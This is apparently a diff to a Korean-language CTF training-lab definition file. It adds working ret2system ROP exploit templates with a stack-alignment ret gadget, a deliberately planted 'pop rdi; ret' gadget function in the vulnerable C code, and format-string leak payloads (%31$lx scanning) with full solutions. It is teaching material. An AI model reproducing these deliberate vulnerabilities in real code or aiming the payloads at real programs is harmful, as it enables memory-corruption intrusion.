@@ -228,6 +228,13 @@ void unused(void) {
     system("echo this line never runs");
 }
 
+void gadget_holder(void) {
+    // 이 함수도 호출되지 않습니다. 최신 툴체인(Ubuntu 22.04 + gcc 11)으로 빌드하면
+    // 바이너리 안에 pop rdi; ret 가젯이 우연히 생기지 않는 경우가 있어(실제로 검증됨),
+    // ROPgadget으로 찾을 수 있는 가젯을 이 함수 안에 명시적으로 만들어 둡니다.
+    __asm__ __volatile__("pop %rdi\\n\\tret");
+}
+
 void vulnerable(void) {
     char buffer[64];
     printf("Enter your name: ");
@@ -253,15 +260,16 @@ int main(void) {
         ],
         "analysis_steps": [
             "ret2win과 동일하게 gdb + cyclic(200)으로 return address까지의 정확한 오프셋을 구합니다.",
-            "ROPgadget --binary ret2system --only \"pop|ret\" 로 pop rdi; ret 가젯의 주소를 찾습니다. (x86-64는 함수 인자를 rdi 레지스터로 전달하므로, system(cmd)을 호출하려면 호출 직전에 rdi에 cmd 문자열의 주소를 넣어야 합니다.)",
-            "payload = 패딩(OFFSET) + pop_rdi_ret 주소 + cmd 문자열 주소 + system@plt 주소 순서로 이어붙입니다.",
-            "실행 후 화면에 flag(echo 명령의 출력)가 그대로 출력되는지 확인합니다.",
+            "ROPgadget --binary ret2system --only \"pop|ret\" 로 pop rdi; ret 가젯의 주소와, 인자 없는 단독 ret 가젯의 주소를 함께 찾습니다. (x86-64는 함수 인자를 rdi 레지스터로 전달하므로, system(cmd)을 호출하려면 호출 직전에 rdi에 cmd 문자열의 주소를 넣어야 합니다.)",
+            "payload = 패딩(OFFSET) + pop_rdi_ret 주소 + cmd 문자열 주소 + ret(정렬용) 주소 + system@plt 주소 순서로 이어붙입니다.",
+            "실행 후 화면에 flag(echo 명령의 출력)가 그대로 출력되는지 확인합니다. 만약 아무 출력도 없이 멈춘다면 다음 힌트의 스택 정렬 문제를 의심하세요.",
         ],
         "hints": [
             "system()은 unused() 함수 안에서만 호출되지만, 이 함수 자체가 호출되지 않아도 컴파일된 바이너리에는 system()의 PLT 항목이 남아있습니다.",
             "cmd는 포인터가 아니라 char 배열로 선언되어 있어, cmd의 주소 자체가 그 문자열(\"echo PWN{...}\")의 실제 위치입니다.",
             "x86-64 System V 호출 규약에서 함수의 첫 번째 인자는 rdi 레지스터에 담깁니다 — 그래서 'pop rdi; ret' 가젯이 필요합니다.",
-            "payload 순서를 헷갈리지 마세요: [pop rdi 가젯 주소] 다음에 오는 값이 rdi에 들어갈 값(cmd 문자열 주소)이고, 그 다음이 pop rdi 가젯의 ret가 점프할 곳(system 주소)입니다.",
+            "payload 순서를 헷갈리지 마세요: [pop rdi 가젯 주소] 다음에 오는 값이 rdi에 들어갈 값(cmd 문자열 주소)이고, 그 다음이 system 주소로 이어지는 부분입니다.",
+            "system@plt로 바로 점프했는데 아무 출력도 없이 조용히 멈춘다면, 최신 glibc(Ubuntu 22.04 기준)는 내부적으로 16바이트 스택 정렬을 요구하는 SSE 명령어(movaps 등)를 쓰기 때문일 가능성이 높습니다 — pop_rdi_ret과 system@plt 주소 사이에 인자 없는 'ret' 가젯 하나를 더 끼워 넣어 정렬을 맞추면 해결됩니다 (실제로 이 스택 레이아웃에서 검증된 내용입니다).",
         ],
         "exploit_template": """#!/usr/bin/env python3
 from pwn import *
@@ -276,6 +284,7 @@ OFFSET = None  # TODO
 system_addr = elf.plt['system']
 cmd_addr = elf.symbols['cmd']
 pop_rdi_ret = None  # TODO: ROPgadget --binary ret2system --only "pop|ret" 로 확인
+ret_only = None      # TODO: 위 목록에서 인자 없는 단독 'ret' 가젯 주소 (스택 16바이트 정렬용)
 
 log.info(f"system@plt: {hex(system_addr)}")
 log.info(f"cmd (\\"echo PWN{{...}}\\"): {hex(cmd_addr)}")
@@ -283,6 +292,7 @@ log.info(f"cmd (\\"echo PWN{{...}}\\"): {hex(cmd_addr)}")
 payload = b'A' * OFFSET
 payload += p64(pop_rdi_ret)
 payload += p64(cmd_addr)
+payload += p64(ret_only)     # system() 진입 전 스택을 16바이트로 재정렬 (없으면 SIGSEGV로 조용히 죽음)
 payload += p64(system_addr)
 
 p.send(payload)
@@ -292,7 +302,7 @@ print(p.recvall(timeout=3).decode(errors="replace"))
 2. gdb + cyclic(200)으로 return address까지의 오프셋을 구합니다 (ret2win과 동일한 방법).
 3. objdump -d ret2system | grep 'system@plt' 로 system의 PLT 주소를 확인합니다.
 4. objdump -t ret2system | grep ' cmd' 로 cmd 문자열("echo PWN{...}")의 주소를 확인합니다.
-5. ROPgadget --binary ret2system --only "pop|ret" 로 pop rdi; ret 가젯 주소를 확인합니다.
+5. ROPgadget --binary ret2system --only "pop|ret" 로 pop rdi; ret 가젯 주소와 단독 ret 가젯 주소를 확인합니다.
 6. 아래처럼 exploit.py를 작성해 실행합니다:
 
 from pwn import *
@@ -302,9 +312,14 @@ OFFSET = 72  # 직접 구한 값으로 교체
 payload = b'A' * OFFSET
 payload += p64(POP_RDI_RET)          # 3~5단계에서 구한 가젯 주소
 payload += p64(elf.symbols['cmd'])   # cmd 문자열("echo PWN{...}") 주소
+payload += p64(RET_ONLY)             # system() 호출 전 스택 16바이트 정렬용 (없으면 SIGSEGV)
 payload += p64(elf.plt['system'])    # system@plt 주소
 p.send(payload)
 print(p.recvall(timeout=3).decode(errors="replace"))
+
+주의: RET_ONLY(정렬용 ret) 가젯이 없으면 최신 glibc(Ubuntu 22.04 기준)의 system() 내부에서
+movaps 같은 SSE 명령어가 16바이트로 정렬되지 않은 스택 때문에 SIGSEGV로 조용히 죽어버립니다.
+아무 출력도 없이 멈춘다면 이 정렬 문제부터 의심하세요.
 
 7. system(cmd)이 실행되며 "echo PWN{...}" 명령의 출력, 즉 flag가 화면에 나타납니다:
    PWN{r3t2sy5tem_ropp1ng_w1th_style}
@@ -375,21 +390,21 @@ int main(void) {
             "(printf(buffer)에 대한 -Wformat-security 경고가 뜰 수 있는데, 이 챌린지에서는 의도된 것이므로 무시해도 됩니다.)",
         ],
         "analysis_steps": [
-            "./fmtstr 를 실행하고 첫 입력에 %p %p %p %p %p %p %p %p %p %p 처럼 %p나 %lx를 여러 개 넣어 스택 값들을 순서대로 출력해봅니다.",
+            "./fmtstr 를 실행하고 첫 입력에 %1$lx.%2$lx.%3$lx. ... 처럼 %N$lx를 30개 이상 넉넉히 이어붙여 스택 값들을 순서대로 출력해봅니다 (실제로 검증한 이 빌드 환경에서는 31번째 인자 근처에서 나타났습니다 — 컴파일러/환경에 따라 달라질 수 있으니 10개 정도로는 부족할 수 있습니다).",
             "출력된 값들 중 deadbeefcafebabe 패턴(혹은 그 일부)이 보이는 위치를 찾습니다.",
-            "%N$lx 형식(예: %9$lx)으로 정확히 그 위치 하나만 지정해서 값을 다시 확인합니다.",
+            "%N$lx 형식(예: %31$lx)으로 정확히 그 위치 하나만 지정해서 값을 다시 확인합니다.",
             "찾은 값을 두 번째 입력(Guess)에 16진수 그대로(deadbeefcafebabe) 입력하면 flag가 출력됩니다.",
         ],
         "hints": [
             "%p는 포인터 형식(0x가 붙은 16진수)으로, %lx는 8바이트 16진수로 스택 값을 출력합니다.",
             "printf(buffer)처럼 두 번째 인자 없이 포맷 문자열만 있으면, %x/%p/%lx는 실제로는 존재하지 않는 인자 대신 레지스터와 스택에 남아있던 값을 그대로 읽어옵니다.",
-            "몇 번째(%N$) 인자인지는 컴파일러/환경마다 다를 수 있습니다 — 처음부터 순서대로(%1$lx, %2$lx, ...) 넓게 스캔해보세요.",
+            "몇 번째(%N$) 인자인지는 컴파일러/환경마다 다를 수 있습니다 — 처음부터 순서대로(%1$lx, %2$lx, ...) 넓게(최소 30~40개까지) 스캔해보세요. 이 실습실 빌드 환경에서 실제로 검증한 위치는 %31$lx였습니다.",
             "값이 정확히 deadbeefcafebabe로 보이는 위치가 정답입니다. 일부만 보이면(예: 4바이트만) %lx 대신 %x를 두 번 조합해보세요.",
         ],
         "solution": """1. gcc -fno-stack-protector -no-pie -o fmtstr fmtstr.c 로 빌드합니다.
-2. 실행 후 첫 입력에 다음처럼 넣어 스택을 넓게 스캔합니다:
-   %1$lx.%2$lx.%3$lx.%4$lx.%5$lx.%6$lx.%7$lx.%8$lx.%9$lx.%10$lx
-3. 출력 중 deadbeefcafebabe 값이 보이는 위치(%N$)를 확인합니다.
+2. 실행 후 첫 입력에 다음처럼 넣어 스택을 넓게(최소 30개 이상) 스캔합니다:
+   %1$lx.%2$lx.%3$lx. ... .%35$lx   (파이썬으로 '.'.join(f'%{i}$lx' for i in range(1,36)) 처럼 생성하면 편합니다)
+3. 출력 중 deadbeefcafebabe 값이 보이는 위치(%N$)를 확인합니다 (이 빌드 환경에서 실제로 검증한 위치는 31번째였습니다 — %1~%10만 스캔하면 못 찾을 수 있으니 주의하세요).
 4. 두 번째 입력(Guess)에 정확히 deadbeefcafebabe 를 입력합니다.
 5. flag가 출력됩니다: PWN{f0rm4t_str1ng_1nf0_l34k}
 
